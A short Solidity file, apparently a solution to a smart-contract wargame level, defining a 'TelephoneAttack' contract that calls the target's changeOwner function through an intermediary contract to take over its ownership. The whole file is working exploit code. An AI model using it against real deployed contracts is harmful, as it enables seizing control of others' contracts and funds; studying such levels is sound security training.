// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {

address teleaddr;
  constructor(address _teleaddr) public {
    teleaddr = _teleaddr;
  }

  function Attack() external {
    Telephone tele = Telephone(teleaddr);
    tele.changeOwner(msg.sender);
  }
}